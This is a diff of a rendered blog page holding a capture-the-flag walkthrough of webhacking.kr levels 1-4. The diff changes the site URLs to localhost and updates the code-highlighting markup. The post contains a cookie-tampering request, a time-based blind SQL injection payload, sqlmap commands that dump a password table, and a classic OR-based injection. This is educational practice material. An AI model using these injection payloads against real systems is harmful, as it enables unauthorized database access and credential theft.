@@ -42,11 +42,11 @@
   
   <!-- Facebook OGP cards -->
   <meta property="og:description" content="This blog post contains a walk-through of https://webhacking.kr/ wargames which was recommended to me by a friend." />
-  <meta property="og:url" content="http://snoopysecurity.github.io" />
+  <meta property="og:url" content="http://localhost:4000" />
   <meta property="og:site_name" content="💻 | Blog" />
   <meta property="og:title" content="Webhacking.kr Solutions" />
   <meta property="og:type" content="website" />
-  <meta property="og:image" content="http://snoopysecurity.github.io/assets/logo.png" />
+  <meta property="og:image" content="http://localhost:4000/assets/logo.png" />
   <meta property="og:image:type" content="image/png" />
   <meta property="og:image:width" content="612" />
   <meta property="og:image:height" content="605" />
@@ -57,16 +57,16 @@
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Webhacking.kr Solutions">
   <meta name="twitter:description" content="This blog post contains a walk-through of https://webhacking.kr/ wargames which was recommended to me by a friend.">
-  <meta name="twitter:image" content="http://snoopysecurity.github.io/assets/logo.png">
-  <meta name="twitter:url" content="http://snoopysecurity.github.io">
+  <meta name="twitter:image" content="http://localhost:4000/assets/logo.png">
+  <meta name="twitter:url" content="http://localhost:4000">
   
 
   
 
   <!-- Site styles -->
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="http://snoopysecurity.github.io/capture-the-flag/2020/04/03/04_webhacking_kr_solutions.html">
-  <link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://snoopysecurity.github.io/feed.xml" />
+  <link rel="canonical" href="http://localhost:4000/capture-the-flag/2020/04/03/04_webhacking_kr_solutions.html">
+  <link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://localhost:4000/feed.xml" />
 </head>
 
 
@@ -159,11 +159,11 @@
 
 <p><img src="/assets/webhackingkr/1-1.png" alt="" /></p>
 
-<p>A cookie called <code class="highlighter-rouge">user_lv</code> is being set every time the user visits the page which has a numeric value. If this value is more that 6, then the backend application will set it to 1. If this value is more than 5, then the <code class="highlighter-rouge">solve</code> function can be triggered.</p>
+<p>A cookie called <code class="language-plaintext highlighter-rouge">user_lv</code> is being set every time the user visits the page which has a numeric value. If this value is more that 6, then the backend application will set it to 1. If this value is more than 5, then the <code class="language-plaintext highlighter-rouge">solve</code> function can be triggered.</p>
 
-<p>This function can be triggered by sending a value such as <code class="highlighter-rouge">5.5</code> which is smaller than <code class="highlighter-rouge">6</code> and is higher than <code class="highlighter-rouge">5</code>.</p>
+<p>This function can be triggered by sending a value such as <code class="language-plaintext highlighter-rouge">5.5</code> which is smaller than <code class="language-plaintext highlighter-rouge">6</code> and is higher than <code class="language-plaintext highlighter-rouge">5</code>.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>GET /challenge/web-01/ HTTP/1.1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /challenge/web-01/ HTTP/1.1
 Host: webhacking.kr
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -175,8 +175,7 @@ Cookie: user_lv=5.5; PHPSESSID=qksuhplclrtd25armt59rkatn6
 Upgrade-Insecure-Requests: 1
 Cache-Control: max-age=0
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="level-2">Level 2</h3>
 
@@ -184,31 +183,29 @@ Cache-Control: max-age=0
 
 <p><img src="/assets/webhackingkr/2.png" alt="" /></p>
 
-<p>Looking at the response, a cookie named <code class="highlighter-rouge">time</code> is being set which reflects the date and time value show in the above HTML comment.</p>
+<p>Looking at the response, a cookie named <code class="language-plaintext highlighter-rouge">time</code> is being set which reflects the date and time value show in the above HTML comment.</p>
 
 <p><img src="/assets/webhackingkr/2-1.png" alt="" /></p>
 
-<p>The presence of SQL Injection can be discovered by trying a query such as <code class="highlighter-rouge">1604695706 AND 1=1</code> which returns true returns the following data: <code class="highlighter-rouge">2070-01-01 09:00:01</code>, and <code class="highlighter-rouge">1604695706 AND 1=2</code> which returns <code class="highlighter-rouge">2070-01-01 09:00:00</code>.</p>
+<p>The presence of SQL Injection can be discovered by trying a query such as <code class="language-plaintext highlighter-rouge">1604695706 AND 1=1</code> which returns true returns the following data: <code class="language-plaintext highlighter-rouge">2070-01-01 09:00:01</code>, and <code class="language-plaintext highlighter-rouge">1604695706 AND 1=2</code> which returns <code class="language-plaintext highlighter-rouge">2070-01-01 09:00:00</code>.</p>
 
-<p>Since the vulnerability is a blind based SQL injection, time-based blind techniques can be used to iterate through characters and compare them with the index of the current database name using an IF statement, and if this statement is true, then the MySQL <code class="highlighter-rouge">sleep</code> function is triggered for 5 seconds. An example of this can be seen below.</p>
+<p>Since the vulnerability is a blind based SQL injection, time-based blind techniques can be used to iterate through characters and compare them with the index of the current database name using an IF statement, and if this statement is true, then the MySQL <code class="language-plaintext highlighter-rouge">sleep</code> function is triggered for 5 seconds. An example of this can be seen below.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>1604695706 AND 7678=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;48),SLEEP(5),7678)
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1604695706 AND 7678=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&gt;48),SLEEP(5),7678)
+</code></pre></div></div>
 
 <p>The same technique can be used to iterate through and extract more data.</p>
 
 <p>SQLMap can be used to automate this process.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6'
-</code></pre>
-</div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6'
+</code></pre></div></div>
 
 <p>To get the current database the application is running under, the ` –current-db` option can be used which reveals the current database to be ‘chall2’.</p>
 
 <p>SQLMap can then be used to get the tables belonging to this database.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6' -D chall2 --table
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -u 'https://webhacking.kr:443/challenge/web-02/' --technique=TBSQ --cookie='time=1604695706*;PHPSESSID=qksuhplclrtd25armt59rkatn6' -D chall2 --table
 
 Database: chall2
 [2 tables]
@@ -216,10 +213,9 @@ Database: chall2
 | admin_area_pw |
 | log           |
 +---------------+
-</code></pre>
-</div>
+</code></pre></div></div>
 
-<p>The <code class="highlighter-rouge">--dump</code> option can be used to extract the password.</p>
+<p>The <code class="language-plaintext highlighter-rouge">--dump</code> option can be used to extract the password.</p>
 
 <p><img src="/assets/webhackingkr/2-2.png" alt="" /></p>
 
@@ -243,7 +239,7 @@ Database: chall2
 
 <p>A hidden parameter exists which is vulnerable to SQL injection, this can be exploited as follows.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>POST /challenge/web-03/index.php HTTP/1.1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /challenge/web-03/index.php HTTP/1.1
 Host: webhacking.kr
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -258,8 +254,7 @@ Cookie: PHPSESSID=qksuhplclrtd25armt59rkatn6
 Upgrade-Insecure-Requests: 1
 
 answer='+OR+'1'='1&amp;id=SS
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><img src="/assets/webhackingkr/3-4.png" alt="" /></p>
 
@@ -267,41 +262,40 @@ answer='+OR+'1'='1&amp;id=SS
 
 <p>The following code is presented for Level 4.</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code> <span class="cp">&lt;?php
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;?php
   include "../../config.php";
   if($_GET['view-source'] == 1) view_source();
-?&gt;</span><span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;head&gt;</span>
-<span class="nt">&lt;title&gt;</span>Challenge 4<span class="nt">&lt;/title&gt;</span>
-<span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
-<span class="nt">body</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span><span class="no">black</span><span class="p">;</span> <span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span> <span class="nl">font-size</span><span class="p">:</span><span class="m">9pt</span><span class="p">;</span> <span class="p">}</span>
-<span class="nt">table</span> <span class="p">{</span> <span class="nl">color</span><span class="p">:</span><span class="no">white</span><span class="p">;</span> <span class="nl">font-size</span><span class="p">:</span><span class="m">10pt</span><span class="p">;</span> <span class="p">}</span>
-<span class="nt">&lt;/style&gt;</span>
-<span class="nt">&lt;/head&gt;</span>
-<span class="nt">&lt;body&gt;&lt;br&gt;&lt;br&gt;</span>
-<span class="nt">&lt;center&gt;</span>
-<span class="cp">&lt;?php
+?&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Challenge 4&lt;/title&gt;
+&lt;style type="text/css"&gt;
+body { background:black; color:white; font-size:9pt; }
+table { color:white; font-size:10pt; }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;&lt;br&gt;&lt;br&gt;
+&lt;center&gt;
+&lt;?php
   sleep(1); // anti brute force
   if((isset($_SESSION['chall4'])) &amp;&amp; ($_POST['key'] == $_SESSION['chall4'])) solve(4);
   $hash = rand(10000000,99999999)."salt_for_you";
   $_SESSION['chall4'] = $hash;
   for($i=0;$i&lt;500;$i++) $hash = sha1($hash);
-?&gt;</span><span class="nt">&lt;br&gt;</span>
-<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">post</span><span class="nt">&gt;</span>
-<span class="nt">&lt;table</span> <span class="na">border=</span><span class="s">0</span> <span class="na">align=</span><span class="s">center</span> <span class="na">cellpadding=</span><span class="s">10</span><span class="nt">&gt;</span>
-<span class="nt">&lt;tr&gt;&lt;td</span> <span class="na">colspan=</span><span class="s">3</span> <span class="na">style=</span><span class="s">background:silver;color:green;</span><span class="nt">&gt;&lt;b&gt;</span><span class="cp">&lt;?=$hash?&gt;</span><span class="nt">&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;</span>
-<span class="nt">&lt;tr</span> <span class="na">align=</span><span class="s">center</span><span class="nt">&gt;&lt;td&gt;</span>Password<span class="nt">&lt;/td&gt;&lt;td&gt;&lt;input</span> <span class="na">name=</span><span class="s">key</span> <span class="na">type=</span><span class="s">text</span> <span class="na">size=</span><span class="s">30</span><span class="nt">&gt;&lt;/td&gt;&lt;td&gt;&lt;input</span> <span class="na">type=</span><span class="s">submit</span><span class="nt">&gt;&lt;/td&gt;&lt;/tr&gt;</span>
-<span class="nt">&lt;/table&gt;</span>
-<span class="nt">&lt;/form&gt;</span>
-<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">?view-source=1</span><span class="nt">&gt;</span>[view-source]<span class="nt">&lt;/a&gt;</span>
-<span class="nt">&lt;/center&gt;</span>
-<span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
+?&gt;&lt;br&gt;
+&lt;form method=post&gt;
+&lt;table border=0 align=center cellpadding=10&gt;
+&lt;tr&gt;&lt;td colspan=3 style=background:silver;color:green;&gt;&lt;b&gt;&lt;?=$hash?&gt;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr align=center&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input name=key type=text size=30&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/form&gt;
+&lt;a href=?view-source=1&gt;[view-source]&lt;/a&gt;
+&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
 
-</code></pre>
-</div>
+</code></pre></div></div>
 
-<p>The above PHP code takes a number between 10000000 and 99999999 and merges it with <code class="highlighter-rouge">salt_for_you</code>. This value is then encrypted 500 times with the <code class="highlighter-rouge">sha1</code> hashing algorithm.</p>
+<p>The above PHP code takes a number between 10000000 and 99999999 and merges it with <code class="language-plaintext highlighter-rouge">salt_for_you</code>. This value is then encrypted 500 times with the <code class="language-plaintext highlighter-rouge">sha1</code> hashing algorithm.</p>
 
 
 </article>
@@ -319,7 +313,7 @@ answer='+OR+'1'='1&amp;id=SS
   
     
     
-      <a href="//twitter.com/share?text=Webhacking.kr+Solutions&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html&via=snoopysecurity"
+      <a href="//twitter.com/share?text=Webhacking.kr+Solutions&url=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html&via=snoopysecurity"
         onclick="window.open(this.href, 'twitter-share', 'width=550,height=255');return false;">
         <i class="fa fa-twitter-square fa-lg"></i>
       </a>
@@ -334,7 +328,7 @@ answer='+OR+'1'='1&amp;id=SS
     
     
     
-      <a href="//www.facebook.com/sharer.php?t=Webhacking.kr+Solutions&u=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html"
+      <a href="//www.facebook.com/sharer.php?t=Webhacking.kr+Solutions&u=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html"
         onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
         <i class="fa fa-facebook-square fa-lg"></i>
       </a>
@@ -359,7 +353,7 @@ answer='+OR+'1'='1&amp;id=SS
     
     
     
-      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html"
+      <a href="//www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html"
         onclick="window.open(this.href, 'linkedin-share', 'width=550,height=255');return false;">
         <i class="fa fa-linkedin-square fa-lg"></i>
       </a>
@@ -401,7 +395,7 @@ answer='+OR+'1'='1&amp;id=SS
     
     
     
-      <a href="//www.pinterest.com/pin/create/button/?description=Webhacking.kr+Solutions&url=http%3A%2F%2Fsnoopysecurity.github.io%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html&media=http://snoopysecurity.github.io/assets/header_img.jpg"
+      <a href="//www.pinterest.com/pin/create/button/?description=Webhacking.kr+Solutions&url=http%3A%2F%2Flocalhost%3A4000%2Fcapture-the-flag%2F2020%2F04%2F03%2F04_webhacking_kr_solutions.html&media=http://localhost:4000/assets/header_img.jpg"
         onclick="window.open(this.href, 'pinterest-share', 'width=550,height=255');return false;">
         <i class="fa fa-pinterest-square fa-lg"></i>
       </a>
